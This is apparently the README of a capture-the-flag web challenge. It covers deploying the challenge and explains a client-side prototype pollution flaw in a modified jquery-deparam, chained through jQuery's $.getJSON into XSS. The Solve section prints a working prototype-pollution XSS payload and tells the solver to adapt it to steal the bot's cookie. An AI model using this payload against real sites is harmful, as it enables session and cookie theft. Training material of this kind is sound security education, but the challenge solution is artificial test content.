# Tic Tac Toe

> Minum cokelat panas, bermain tic tac toe, menyelesaikan puzzle...

## Deploy

Copy `env.example` to `.env` in root and bot directories, then change `.env` values to desired values.

```
docker-compose up -d --build
```

## Description

In this challenge, there is client-side prototype pollution vulnerability in `jquery-deparam`.
It's slightly changed so it does not accept `__proto__` in the param keys.
Also there is a gadget: `jQuery $.getJSON` to be used to trigger the XSS.
For more information, visit https://github.com/BlackFan/client-side-prototype-pollution.

## Solve

Change this XSS payload to get the cookie, and report it to the bot via `/report`.

```
/?turn=O&constructor[prototype][url][]=data:,alert(1);//&constructor[prototype][dataType]=script
```
